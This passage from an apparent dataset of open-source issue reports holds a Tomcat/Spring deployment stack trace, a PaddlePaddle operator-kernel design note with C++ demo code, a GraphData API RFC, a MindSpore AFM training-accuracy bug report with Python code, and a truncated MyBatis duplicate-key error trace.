org.springframework.boot.web.servlet.context.ServletWebServerApplicationContext.createWebServer(ServletWebServerApplicationContext.java:185) at org.springframework.boot.web.servlet.context.ServletWebServerApplicationContext.onRefresh(ServletWebServerApplicationContext.java:154) ... 49 common frames omitted Caused by: org.springframework.beans.BeanInstantiationException: Failed to instantiate [org.springframework.boot.web.servlet.filter.OrderedFormContentFilter]: Factory method 'formContentFilter' threw exception; nested exception is java.lang.NoClassDefFoundError: com/fasterxml/jackson/databind/exc/InvalidDefinitionException at org.springframework.beans.factory.support.SimpleInstantiationStrategy.instantiate(SimpleInstantiationStrategy.java:185) at org.springframework.beans.factory.support.ConstructorResolver.instantiate(ConstructorResolver.java:622) ... 67 common frames omitted Caused by: java.lang.NoClassDefFoundError: com/fasterxml/jackson/databind/exc/InvalidDefinitionException at org.springframework.http.converter.support.AllEncompassingFormHttpMessageConverter.(AllEncompassingFormHttpMessageConverter.java:76) at org.springframework.web.filter.FormContentFilter.(FormContentFilter.java:60) at org.springframework.boot.web.servlet.filter.OrderedFormContentFilter.(OrderedFormContentFilter.java:29) at org.springframework.boot.autoconfigure.web.servlet.WebMvcAutoConfiguration.formContentFilter(WebMvcAutoConfiguration.java:166) at org.springframework.boot.autoconfigure.web.servlet.WebMvcAutoConfiguration$$EnhancerBySpringCGLIB$$73c4b3fe.CGLIB$formContentFilter$1() at org.springframework.boot.autoconfigure.web.servlet.WebMvcAutoConfiguration$$EnhancerBySpringCGLIB$$73c4b3fe$$FastClassBySpringCGLIB$$11b4e9c4.invoke() at org.springframework.cglib.proxy.MethodProxy.invokeSuper(MethodProxy.java:244) at org.springframework.context.annotation.ConfigurationClassEnhancer$BeanMethodInterceptor.intercept(ConfigurationClassEnhancer.java:363) at org.springframework.boot.autoconfigure.web.servlet.WebMvcAutoConfiguration$$EnhancerBySpringCGLIB$$73c4b3fe.formContentFilter() at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62) at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) at java.lang.reflect.Method.invoke(Method.java:498) at org.springframework.beans.factory.support.SimpleInstantiationStrategy.instantiate(SimpleInstantiationStrategy.java:154) ... 68 common frames omitted Caused by: java.lang.ClassNotFoundException: com.fasterxml.jackson.databind.exc.InvalidDefinitionException at org.apache.catalina.loader.WebappClassLoaderBase.loadClass(WebappClassLoaderBase.java:1365) at org.apache.catalina.loader.WebappClassLoaderBase.loadClass(WebappClassLoaderBase.java:1188) ... 82 common frames omitted 31-Aug-2020 14:31:46.842 涓ラ噸 [main] org.apache.catalina.startup.HostConfig.deployWAR 閮ㄧ讲 Web 搴旂敤绋嬪簭 archive [D:\apache-tomcat-9.0.29\webapps\ruoyi-admin.war] 鏃跺嚭閿? java.lang.IllegalStateException: Error starting child at org.apache.catalina.core.ContainerBase.addChildInternal(ContainerBase.java:720) at org.apache.catalina.core.ContainerBase.addChild(ContainerBase.java:690) at org.apache.catalina.core.StandardHost.addChild(StandardHost.java:705) at org.apache.catalina.startup.HostConfig.deployWAR(HostConfig.java:978) at org.apache.catalina.startup.HostConfig$DeployWar.run(HostConfig.java:1849) at java.util.concurrent.Executors$RunnableAdapter.call(Executors.java:511) at java.util.concurrent.FutureTask.run(FutureTask.java:266) at org.apache.tomcat.util.threads.InlineExecutorService.execute(InlineExecutorService.java:75) at java.util.concurrent.AbstractExecutorService.submit(AbstractExecutorService.java:112) at org.apache.catalina.startup.HostConfig.deployWARs(HostConfig.java:773) at org.apache.catalina.startup.HostConfig.deployApps(HostConfig.java:427) at org.apache.catalina.startup.HostConfig.start(HostConfig.java:1576) at org.apache.catalina.startup.HostConfig.lifecycleEvent(HostConfig.java:309) at org.apache.catalina.util.LifecycleBase.fireLifecycleEvent(LifecycleBase.java:123) at org.apache.catalina.util.LifecycleBase.setStateInternal(LifecycleBase.java:423) at org.apache.catalina.util.LifecycleBase.setState(LifecycleBase.java:366) at org.apache.catalina.core.ContainerBase.startInternal(ContainerBase.java:936) at org.apache.catalina.core.StandardHost.startInternal(StandardHost.java:841) at org.apache.catalina.util.LifecycleBase.start(LifecycleBase.java:183) at org.apache.catalina.core.ContainerBase$StartChild.call(ContainerBase.java:1384) at org.apache.catalina.core.ContainerBase$StartChild.call(ContainerBase.java:1374) at java.util.concurrent.FutureTask.run(FutureTask.java:266) at org.apache.tomcat.util.threads.InlineExecutorService.execute(InlineExecutorService.java:75) at java.util.concurrent.AbstractExecutorService.submit(AbstractExecutorService.java:134) at org.apache.catalina.core.ContainerBase.startInternal(ContainerBase.java:909) at org.apache.catalina.core.StandardEngine.startInternal(StandardEngine.java:262) at org.apache.catalina.util.LifecycleBase.start(LifecycleBase.java:183) at org.apache.catalina.core.StandardService.startInternal(StandardService.java:421) at org.apache.catalina.util.LifecycleBase.start(LifecycleBase.java:183) at org.apache.catalina.core.StandardServer.startInternal(StandardServer.java:930) at org.apache.catalina.util.LifecycleBase.start(LifecycleBase.java:183) at org.apache.catalina.startup.Catalina.start(Catalina.java:633) at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62) at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) at java.lang.reflect.Method.invoke(Method.java:498) at org.apache.catalina.startup.Bootstrap.start(Bootstrap.java:343) at org.apache.catalina.startup.Bootstrap.main(Bootstrap.java:474) Caused by: org.apache.catalina.LifecycleException: Failed to start component [StandardEngine[Catalina].StandardHost[localhost].StandardContext[/ruoyi-admin]] at org.apache.catalina.util.LifecycleBase.handleSubClassException(LifecycleBase.java:440) at org.apache.catalina.util.LifecycleBase.start(LifecycleBase.java:198) at org.apache.catalina.core.ContainerBase.addChildInternal(ContainerBase.java:717) ... 37 more Caused by: org.springframework.context.ApplicationContextException: Unable to start web server; nested exception is org.springframework.beans.factory.BeanCreationException: Error creating bean with name 'formContentFilter' defined in class path resource [org/springframework/boot/autoconfigure/web/servlet/WebMvcAutoConfiguration.class]: Bean instantiation via factory method failed; nested exception is org.springframework.beans.BeanInstantiationException: Failed to instantiate [org.springframework.boot.web.servlet.filter.OrderedFormContentFilter]: Factory method 'formContentFilter' threw exception; nested exception is java.lang.NoClassDefFoundError: com/fasterxml/jackson/databind/exc/InvalidDefinitionException at org.springframework.boot.web.servlet.context.ServletWebServerApplicationContext.onRefresh(ServletWebServerApplicationContext.java:157) at org.springframework.context.support.AbstractApplicationContext.refresh(AbstractApplicationContext.java:540) at org.springframework.boot.web.servlet.context.ServletWebServerApplicationContext.refresh(ServletWebServerApplicationContext.java:142) at org.springframework.boot.SpringApplication.refresh(SpringApplication.java:775) at org.springframework.boot.SpringApplication.refreshContext(SpringApplication.java:397) at org.springframework.boot.SpringApplication.run(SpringApplication.java:316) at org.springframework.boot.web.servlet.support.SpringBootServletInitializer.run(SpringBootServletInitializer.java:157) at org.springframework.boot.web.servlet.support.SpringBootServletInitializer.createRootApplicationContext(SpringBootServletInitializer.java:137) at org.springframework.boot.web.servlet.support.SpringBootServletInitializer.onStartup(SpringBootServletInitializer.java:91) at org.springframework.web.SpringServletContainerInitializer.onStartup(SpringServletContainerInitializer.java:171) at org.apache.catalina.core.StandardContext.startInternal(StandardContext.java:5135) at org.apache.catalina.util.LifecycleBase.start(LifecycleBase.java:183) ... 38 more Caused by: org.springframework.beans.factory.BeanCreationException: Error creating bean with name 'formContentFilter' defined in class path resource [org/springframework/boot/autoconfigure/web/servlet/WebMvcAutoConfiguration.class]: Bean instantiation via factory method failed; nested exception is org.springframework.beans.BeanInstantiationException: Failed to instantiate [org.springframework.boot.web.servlet.filter.OrderedFormContentFilter]: Factory method 'formContentFilter' threw exception; nested exception is java.lang.NoClassDefFoundError: com/fasterxml/jackson/databind/exc/InvalidDefinitionException at org.springframework.beans.factory.support.ConstructorResolver.instantiate(ConstructorResolver.java:627) at org.springframework.beans.factory.support.ConstructorResolver.instantiateUsingFactoryMethod(ConstructorResolver.java:456) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.instantiateUsingFactoryMethod(AbstractAutowireCapableBeanFactory.java:1288) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBeanInstance(AbstractAutowireCapableBeanFactory.java:1127) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.doCreateBean(AbstractAutowireCapableBeanFactory.java:538) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBean(AbstractAutowireCapableBeanFactory.java:498) at org.springframework.beans.factory.support.AbstractBeanFactory.lambda$doGetBean$0(AbstractBeanFactory.java:320) at org.springframework.beans.factory.support.DefaultSingletonBeanRegistry.getSingleton(DefaultSingletonBeanRegistry.java:222) at org.springframework.beans.factory.support.AbstractBeanFactory.doGetBean(AbstractBeanFactory.java:318) at org.springframework.beans.factory.support.AbstractBeanFactory.getBean(AbstractBeanFactory.java:204) at org.springframework.boot.web.servlet.ServletContextInitializerBeans.getOrderedBeansOfType(ServletContextInitializerBeans.java:235) at org.springframework.boot.web.servlet.ServletContextInitializerBeans.addAsRegistrationBean(ServletContextInitializerBeans.java:193) at org.springframework.boot.web.servlet.ServletContextInitializerBeans.addAsRegistrationBean(ServletContextInitializerBeans.java:188) at org.springframework.boot.web.servlet.ServletContextInitializerBeans.addAdaptableBeans(ServletContextInitializerBeans.java::170) at org.springframework.boot.web.servlet.ServletContextInitializerBeans.(ServletContextInitializerBeans.java:89) at org.springframework.boot.web.servlet.context.ServletWebServerApplicationContext.getServletContextInitializerBeans(ServletWebServerApplicationContext.java:261) at org.springframework.boot.web.servlet.context.ServletWebServerApplicationContext.selfInitialize(ServletWebServerApplicationContext.java:234) at org.springframework.boot.web.servlet.context.ServletWebServerApplicationContext.createWebServer(ServletWebServerApplicationContext.java:185) at org.springframework.boot.web.servlet.context.ServletWebServerApplicationContext.onRefresh(ServletWebServerApplicationContext.java:154) ... 49 more Caused by: org.springframework.beans.BeanInstantiationException: Failed to instantiate [org.springframework.boot.web.servlet.filter.OrderedFormContentFilter]: Factory method 'formContentFilter' threw exception; nested exception is java.lang.NoClassDefFoundError: com/fasterxml/jackson/databind/exc/InvalidDefinitionException at org.springframework.beans.factory.support.SimpleInstantiationStrategy.instantiate(SimpleInstantiationStrategy.java:185) at org.springframework.beans.factory.support.ConstructorResolver.instantiate(ConstructorResolver.java:622) ... 67 more Caused by: java.lang.NoClassDefFoundError: com/fasterxml/jackson/databind/exc/InvalidDefinitionException at org.springframework.http.converter.support.AllEncompassingFormHttpMessageConverter.(AllEncompassingFormHttpMessageConverter.java:76) at org.springframework.web.filter.FormContentFilter.(FormContentFilter.java:60) at org.springframework.boot.web.servlet.filter.OrderedFormContentFilter.(OrderedFormContentFilter.java:29) at org.springframework.boot.autoconfigure.web.servlet.WebMvcAutoConfiguration.formContentFilter(WebMvcAutoConfiguration.java:166) at org.springframework.boot.autoconfigure.web.servlet.WebMvcAutoConfiguration$$EnhancerBySpringCGLIB$$73c4b3fe.CGLIB$formContentFilter$1() at org.springframework.boot.autoconfigure.web.servlet.WebMvcAutoConfiguration$$EnhancerBySpringCGLIB$$73c4b3fe$$FastClassBySpringCGLIB$$11b4e9c4.invoke() at org.springframework.cglib.proxy.MethodProxy.invokeSuper(MethodProxy.java:244) at org.springframework.context.annotation.ConfigurationClassEnhancer$BeanMethodInterceptor.intercept(ConfigurationClassEnhancer.java:363) at org.springframework.boot.autoconfigure.web.servlet.WebMvcAutoConfiguration$$EnhancerBySpringCGLIB$$73c4b3fe.formContentFilter() at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62) at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) at java.lang.reflect.Method.invoke(Method.java:498) at org.springframework.beans.factory.support.SimpleInstantiationStrategy.instantiate(SimpleInstantiationStrategy.java:154) ... 68 more Caused by: java.lang.ClassNotFoundException: com.fasterxml.jackson.databind.exc.InvalidDefinitionException at org.apache.catalina.loader.WebappClassLoaderBase.loadClass(WebappClassLoaderBase.java:1365) at org.apache.catalina.loader.WebappClassLoaderBase.loadClass(WebappClassLoaderBase.java:1188) ... 82 more 31-Aug-2020 14:31:46.857 淇℃伅 [main] org.apache.catalina.startup.HostConfig.deployWAR Deployment of web application archive [D:\apache-tomcat-9.0.29\webapps\ruoyi-admin.war] has finished in [18,921] ms 31-Aug-2020 14:31:46.862 淇℃伅 [main] org.apache.coyote.AbstractProtocol.start 寮€濮嬪崗璁鐞嗗彞鏌刐""http-nio-8080""] 31-Aug-2020 14:31:46.889 淇℃伅 [main] org.apache.coyote.AbstractProtocol.start 寮€濮嬪崗璁鐞嗗彞鏌刐""ajp-nio-8009""] 31-Aug-2020 14:31:46.902 淇℃伅 [main] org.apache.catalina.startup.Catalina.start Server startup in [18,995] milliseconds   <code>: ---'\____ // // .' \\| |// - . .' /--.--\ .___\_&lt;|&gt;_/___.' &gt;'"""". // // | | : \ _ / / - -. \_ __\ /__ _/ .- -.____ ____.-'======== // //"
need op kernel for Operator,"operator base实现：https://github.com/PaddlePaddle/Paddle/pull/2725 在operator base基础上，带kernel的Op的demo：https://github.com/PaddlePaddle/Paddle/pull/2796 一个带kernel的op的demo cos_op 有两种实现Op的方式： 无kernel。Op带模板参数，注册时注册不同类型Op，new Op的时候需要生成特定类型的Op。 有kernel。Op不带模板参数，一种类型的Op只注册一次，同时每种Op需要注册多种kernel，new Op的时候无需特定类型的Op，运行前或者运行时决定运行哪种kernel。 上述两种方式的区别： new op时是否需要带device信息。 无kernel。new op时需要带device信息，构建之后Op类型确定，无法修改。构建过程会变得复杂，需要对每个op管理device信息，运行时也不好调整和优化。 有kernel。new op时无需带device信息，构建完成后根据情况决定运行何种kernel。灵活，用户无需事先关心device信息，方便运行时优化。和paddle目前的做法保持一致。 注册方式。 不同框架对比： tensorflow。有kernel，构建Graph的时候，Node可以指定device，但是可以在真正运行时调整，kernel和device绑定，特定device的executor会选择对应的kernel运行。 refs: tensorflow-operator Mxnet。有kernel，kernel以function的形式保存，在运行graph之前，会bind到具体的node上。refs: mxnet operator caffe2。没有kernel，opdef中需要指定device信息，如果没有，默认使用net的device，创建Operator时会根据device_option 创建特定类型的Op，TryCreateOperator，运行时无法调整。 实现kernel带来的问题： kernel如何与Op绑定。 简单方法就是每个OP保存一个kernel数组。例如 如何运行时根据上下文切换Kernel。 简单做法，根据context判断 集中框架的对比。 多数框架带有kernel。 实现带kernel的版本不复杂。 带kernel更易于优化整个计算过程(graph)。 一个demo op的实现 简单带kernel的Op的运行方式： 构造不同类型的context 使用更复杂的注册和key来寻找。 运行之前统一bind一次，将kernel类型保存在op中。 op的运行   <code>: typedef std::function&lt;void(OpContext*)&gt; ComputeFun; /// simple kernel template&lt;typename T&gt; void CosineCPU(OpContext* ctx) { printf(""run cosin op CPU kernel, scale = %f\n"", ctx-&gt;op-&gt;GetAttr&lt;T&gt;(""scale"")); printf(""%s\n"", ctx-&gt;op-&gt;DebugString().c_str()); } template&lt;typename T&gt; void CosineGPU(OpContext* ctx) { printf(""run cosin op GPU kernel, scale = %f\n"", ctx-&gt;op-&gt;GetAttr&lt;T&gt;(""scale"")); printf(""%s\n"", ctx-&gt;op-&gt;DebugString().c_str()); } class CosOp : public OperatorBase { public: explicit CosOp() { kernels_[""CPU""] = CosineCPU&lt;float&gt;; kernels_[""GPU""] = CosineGPU&lt;float&gt;; } void Run(OpContext* ctx) const override { auto dev_ctx = dynamic_cast&lt;CPUDeviceContext*&gt;(ctx-&gt;device_context); if (dev_ctx != nullptr) { kernels_.at(""CPU"")(ctx); } else { kernels_.at(""GPU"")(ctx); } } private: std::map&lt;std::string, ComputeFun&gt; kernels_; }; DeviceContext* cpu_ctx = new CPUDeviceContext(); DeviceContext* gpu_ctx = new CUDADeviceContext(); auto scope = std::make_shared&lt;Scope&gt;(); OperatorBase* op = paddle::framework::OpRegistry::CreateOp(op_desc); // will run on cpu kernel op-&gt;Run(scope, cpu_ctx); // will run on gpu kernel op-&gt;Run(scope, gpu_ctx);"
GraphData support random_walk and get_edge_feature,RFC GraphData support random_walk and get_edge_feature Trail No. Task Description Related Issue(URL) 1 2   <code>: def random_walk( target_nodes (list[int]): Start node list in random walk meta_path (list[int]): node type for each walk step step_home_param (float): return hyper parameter in node2vec algorithm step_away_param (float): inout hyper parameter in node2vec algorithm default_node (int): default node if no more neighbors found ) def get_edge_feature( edge_list (list or numpy.ndarray): The given list of edges. feature_types (list or ndarray): The given list of feature types. )
【MindSpore】【GPU】AFM网络训练精度不上升,"`mindspore-assistant` //comp/kind/precision //comp/mindspore-assistant //comp/py-data : GPU /device gpu : -- MindSpore version : 1.5.0 -- Python version : 3.7.5 -- OS platform and distribution : Linux Ubuntu 16.04 -- GCC/Compiler version : Related code model.py train.py python train.py 开始训练 可以发现loss下降一定程度后，auc从第一个epoch开始始终不变，并且auc=0.5说明根本就没收敛。 本身这个网络是基于tensorflow框架的，我是基于此重写，期待loss下降，验证集auc上升。 mindspore训练输出，查看auc指标，后面几个epoch都是不变的 检查过metric, loss做过单元测试都是一致。   <code>: import itertools from mindspore.nn.metrics import Metric from mindspore import ops from mindspore import nn from mindspore.numpy import stack from mindspore import Tensor from mindspore.nn.loss import BCELoss class AFM(nn.Cell): def __init__(self, feature_columns, mode, att_vector=8, activation='relu', dropout=0.5, embed_reg=1e-6): """""" AFM :param feature_columns: A list. sparse column feature information. :param mode: A string. 'max'(MAX Pooling) or 'avg'(Average Pooling) or 'att'(Attention) :param att_vector: A scalar. attention vector. :param activation: A string. Activation function of attention. :param dropout: A scalar. Dropout. :param embed_reg: A scalar. the regularizer of embedding """""" super(AFM, self).__init__() self.sparse_feature_columns = feature_columns print(f""feature_columns: {feature_columns}"") self.mode = mode self.embed_layers = nn.CellList() for i, feat in enumerate(self.sparse_feature_columns): self.embed_layers.append(nn.Embedding(vocab_size=feat['feat_num'], embedding_size=feat['embed_dim'], embedding_table='uniform')) self.dense = nn.Dense(8, 1, weight_init='uniform', bias_init='zeros', has_bias=True) self.Mul = ops.Mul() self.Transpose = ops.Transpose() self.Stack = ops.Stack self.Gather = ops.Gather() self.Sigmoid = ops.Sigmoid() self.ReduceSum_false = ops.ReduceSum(False) def construct(self, inputs): # Input Layer sparse_inputs = inputs # Embedding Layer embed = [self.embed_layers[i](sparse_inputs[:, i]) for i in range(sparse_inputs.shape[1])] embed = stack(embed) embed = self.Transpose(embed, (1, 0, 2)) # (None, len(sparse_inputs), embed_dim) row = [] col = [] for r, c in itertools.combinations(range(len(self.sparse_feature_columns)), 2): row.append(r) col.append(c) row = Tensor(row) col = Tensor(col) p = self.Gather(embed, row, 1) # (None, (len(sparse) * len(sparse) - 1) / 2, k) q = self.Gather(embed, col, 1) # (None, (len(sparse) * len(sparse) - 1) / 2, k) bi_interaction = self.Mul(p, q) # (None, (len(sparse) * len(sparse) - 1) / 2, k) # mode x = self.ReduceSum_false(bi_interaction, axis=1) # (None, k) # Output Layer outputs = self.Sigmoid(self.dense(x)) return outputs def summary(self): print(self) class AUC(Metric): """"""AUC metric for AutoDis model."""""" def __init__(self): super().__init__() self.logits = [] self.labels = [] def clear(self): self.logits = [] self.labels = [] self.value = None def update(self, *inputs): batch_predict = inputs[1].asnumpy() batch_label = inputs[2].asnumpy() self.logits.extend(batch_predict.flatten().tolist()) self.labels.extend(batch_label.flatten().tolist()) def eval(self): if len(self.labels) != len(self.logits): raise RuntimeError('labels.size() is not equal to logits.size()') from sklearn.metrics import roc_auc_score auc = roc_auc_score(self.labels, self.logits) return auc class BinaryCrossentropy(BCELoss): def __init__(self): super().__init__(reduction='mean') def construct(self, logits, labels): if logits.dtype != labels.dtype: labels = labels.astype(logits.dtype) if logits.shape != labels.shape: labels = labels.reshape(logits.shape) return super(BinaryCrossentropy, self).construct(logits, labels) import os from mindspore import nn from model import AFM, AUC, BinaryCrossentropy from data_process.criteo import create_criteo_dataset from mindspore import context from mindspore import dataset as ds import numpy as np os.environ['TF_CPP_MIN_LOG_LEVEL'] = '2' context.set_context(mode=context.PYNATIVE_MODE) if __name__ == '__main__': # =============================== GPU ============================== # gpu = tf.config.experimental.list_physical_devices(device_type='GPU') # print(gpu) # If you have GPU, and the value is GPU serial number. # os.environ['CUDA_VISIBLE_DEVICES'] = '0' # ========================= Hyper Parameters ======================= # you can modify your file path file = '/home/wangyixian/data/train.txt' #../dataset/Criteo/train.txt' read_part = True # sample_num = 5000000 sample_num = 500000 test_size = 0.2 embed_dim = 8 att_vector = 8 mode = 'max' # 'max', 'avg' dropout = 0.5 activation = 'relu' embed_reg = 1e-5 learning_rate = 0.001 batch_size = 4096 epochs = 15 # ========================== Create dataset ======================= feature_columns, train, test = create_criteo_dataset(file=file, embed_dim=embed_dim, read_part=read_part, sample_num=sample_num, test_size=test_size) train_X, train_y = train test_X, test_y = test # ============================Build Model========================== # mirrored_strategy = tf.distribute.MirroredStrategy() # with mirrored_strategy.scope(): model = AFM(feature_columns, mode, att_vector, activation, dropout, embed_reg) model.summary() # =========================Compile============================ optimizer = nn.Adam(model.trainable_params(), learning_rate=learning_rate, beta1=0.9, beta2=0.999, eps=1e-7) loss_fn = BinaryCrossentropy() with_loss_cell = nn.WithLossCell(model, loss_fn) eval_network = nn.WithEvalCell(model, loss_fn) one_step_cell = nn.TrainOneStepCell(with_loss_cell, optimizer) dataset = ds.NumpySlicesDataset(data=train_X) dataset_y = ds.NumpySlicesDataset(data=train_y) column_names = dataset_y.get_col_names() new_column_names = list(f""y_{name}"" for name in column_names) dataset_y = dataset_y.rename(column_names, new_column_names) dataset = ds.zip((dataset, dataset_y)) dataset = dataset.batch(batch_size, drop_remainder=False) train_dataset, validation_data = dataset.split([1.0 - 0.1, 0.1]) auc_metric = AUC() for _ in range(epochs): one_step_cell.set_train() for step, x in enumerate(train_dataset): loss = one_step_cell(*x) if step % 10 == 0: print(f""step: {step}, loss: {loss}"") print(""start eval ..."") auc_metric.clear() eval_network.set_train(False) for step, x in enumerate(validation_data): output = eval_network(*x) auc_metric.update(*output) if step % 10 == 0: print(f""step: {step}, eval loss: {output[0]}"") print(""auc is "", auc_metric.eval())"
使用Demo生成的模块主键ID为0造成重复键错误。,"pig版本:3.35   <code>: 2022-01-28 17:58:37,126 [XNIO-1 task-1] ERROR [c.m.s.c.f.s.handle.GlobalBizExceptionHandler] GlobalBizExceptionHandler.java:57 - 全局异常信息 ex= ### Error updating database. Cause: java.sql.SQLIntegrityConstraintViolationException: Duplicate entry '0' for key 'PRIMARY' ### The error may exist in com/mide/sup/demo/mapper/DemoMapper.java (best guess) ### The error may involve com.mide.sup.demo.mapper.DemoMapper.insert-Inline ### The error occurred while setting parameters ### SQL: INSERT INTO demo ( id, username, nicename, create_by, create_time, update_by, update_time ) VALUES ( ?, ?, ?, ?, ?, ?, ? ) ### Cause: java.sql.SQLIntegrityConstraintViolationException: Duplicate entry '0' for key 'PRIMARY' ; Duplicate entry '0' for key 'PRIMARY'; nested exception is java.sql.SQLIntegrityConstraintViolationException: Duplicate entry '0' for key 'PRIMARY' org.springframework.dao.DuplicateKeyException: ### Error updating database. Cause: java.sql.SQLIntegrityConstraintViolationException: Duplicate entry '0' for key 'PRIMARY' ### The error may exist in com/mide/sup/demo/mapper/DemoMapper.java (best guess) ### The error may involve com.mide.sup.demo.mapper.DemoMapper.insert-Inline ### The error occurred while setting parameters ### SQL: INSERT INTO demo ( id, username, nicename, create_by, create_time, update_by, update_time ) VALUES ( ?, ?, ?, ?, ?, ?, ? ) ### Cause: java.sql.SQLIntegrityConstraintViolationException: Duplicate entry '0' for key 'PRIMARY' ; Duplicate entry '0' for key 'PRIMARY'; nested exception is java.sql.SQLIntegrityConstraintViolationException: Duplicate entry '0' for key 'PRIMARY' at org.springframework.jdbc.support.SQLErrorCodeSQLExceptionTranslator.doTranslate(SQLErrorCodeSQLExceptionTranslator.java:247) at org.springframework.jdbc.support.AbstractFallbackSQLExceptionTranslator.translate(AbstractFallbackSQLExceptionTranslator.java:70) at org.mybatis.spring.MyBatisExceptionTranslator.translateExceptionIfPossible(MyBatisExceptionTranslator.java:91) at org.mybatis.spring.SqlSessionTemplate$SqlSessionInterceptor.invoke(SqlSessionTemplate.java:441) at com.sun.proxy.$Proxy149.insert(Unknown Source) at org.mybatis.spring.SqlSessionTemplate.insert(SqlSessionTemplate.java:272) at com.baomidou.mybatisplus.core.override.MybatisMapperMethod.execute(MybatisMapperMethod.java:59) at com.baomidou.mybatisplus.core.override.MybatisMapperProxy$PlainMethodInvoker.invoke(MybatisMapperProxy.java:148) at com.baomidou.mybatisplus.core.override.MybatisMapperProxy.invoke(MybatisMapperProxy.java:89) at com.sun.proxy.$Proxy150.insert(Unknown Source) at com.baomidou.mybatisplus.extension.service.IService.save(IService.java:63) at com.baomidou.mybatisplus.extension.service.IService$$FastClassBySpringCGLIB$$f8525d18.invoke(&lt;generated&gt;) at org.springframework.cglib.proxy.MethodProxy.invoke(MethodProxy.java:218) at org.springframework.aop.framework.CglibAopProxy$DynamicAdvisedInterceptor.intercept(CglibAopProxy.java:689) at com.mide.sup.demo.service.impl.DemoServiceImpl$$EnhancerBySpringCGLIB$$bcf910e2.save(&lt;generated&gt;) at com.mide.sup.demo.controller.DemoController.save(DemoController.java:90) at com.mide.sup.demo.controller.DemoController$$FastClassBySpringCGLIB$$6f1296ea.invoke(&lt;generated&gt;) at org.springframework.cglib.proxy.MethodProxy.invoke(MethodProxy.java:218) at org.springframework.aop.framework.CglibAopProxy$CglibMethodInvocation.invokeJoinpoint(CglibAopProxy.java:783) at org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:163) at org.springframework.aop.framework.CglibAopProxy$CglibMethodInvocation.proceed(CglibAopProxy.java:753) at org.springframework.aop.aspectj.MethodInvocationProceedingJoinPoint.proceed(MethodInvocationProceedingJoinPoint.java:89) at com.mide.sup.common.log.aspect.SysLogAspect.around(SysLogAspect.java:54) at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62) at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) at java.lang.reflect.Method.invoke(Method.java:497) at org.springframework.aop.aspectj.AbstractAspectJAdvice.invokeAdviceMethodWithGivenArgs(AbstractAspectJAdvice.java:634) at org.springframework.aop.aspectj.AbstractAspectJAdvice.invokeAdviceMethod(AbstractAspectJAdvice.java:624) at org.springframework.aop.aspectj.AspectJAroundAdvice.invoke(AspectJAroundAdvice.java:72) at org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:175) at org.springframework.aop.framework.CglibAopProxy$CglibMethodInvocation.proceed(CglibAopProxy.java:753) at org.springframework.security.access.intercept.aopalliance.MethodSecurityInterceptor.invoke(MethodSecurityInterceptor.java:61) at org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:186) at org.springframework.aop.framework.CglibAopProxy$CglibMethodInvocation.proceed(CglibAopProxy.java:753) at org.springframework.aop.interceptor.ExposeInvocationInterceptor.invoke(ExposeInvocationInterceptor.java:97) at org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:186) at org.springframework.aop.framework.CglibAopProxy$CglibMethodInvocation.proceed(CglibAopProxy.java:753) at org.springframework.aop.framework.CglibAopProxy$DynamicAdvisedInterceptor.intercept(CglibAopProxy.java:698) at com.mide.sup.demo.controller.DemoController$$EnhancerBySpringCGLIB$$b9a4761f.save(&lt;generated&gt;) at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62) at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) at java.lang.reflect.Method.invoke(Method.java:497) at org.springframework.web.method.support.InvocableHandlerMethod.doInvoke(InvocableHandlerMethod.java:205) at org.springframework.web.method.support.InvocableHandlerMethod.invokeForRequest(InvocableHandlerMethod.java:150) at org.springframework.web.servlet.mvc.method.annotation.ServletInvocableHandlerMethod.invokeAndHandle(ServletInvocableHandlerMethod.java:117) at org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter.invokeHandlerMethod(RequestMappingHandlerAdapter.java:895) at org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter.handleInternal(RequestMappingHandlerAdapter.java:808) at org.springframework.web.servlet.mvc.method.AbstractHandlerMethodAdapter.handle(AbstractHandlerMethodAdapter.java:87) at org.springframework.web.servlet.DispatcherServlet.doDispatch(DispatcherServlet.java:1067) at org.springframework.web.servlet.DispatcherServlet.doService(DispatcherServlet.java:963) at org.springframework.web.servlet.FrameworkServlet.processRequest(FrameworkServlet.java:1006) at org.springframework.web.servlet.FrameworkServlet.doPost(FrameworkServlet.java:909) at javax.servlet.http.HttpServlet.service(HttpServlet.java:665) at org.springframework.web.servlet.FrameworkServlet.service(FrameworkServlet.java:883) at javax.servlet.http.HttpServlet.service(HttpServlet.java:750) at io.undertow.servlet.handlers.ServletHandler.handleRequest(ServletHandler.java:74) at io.undertow.servlet.handlers.FilterHandler$FilterChainImpl.doFilter(FilterHandler.java:129) at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:327) at org.springframework.security.web.access.intercept.FilterSecurityInterceptor.invoke(FilterSecurityInterceptor.java:115) at 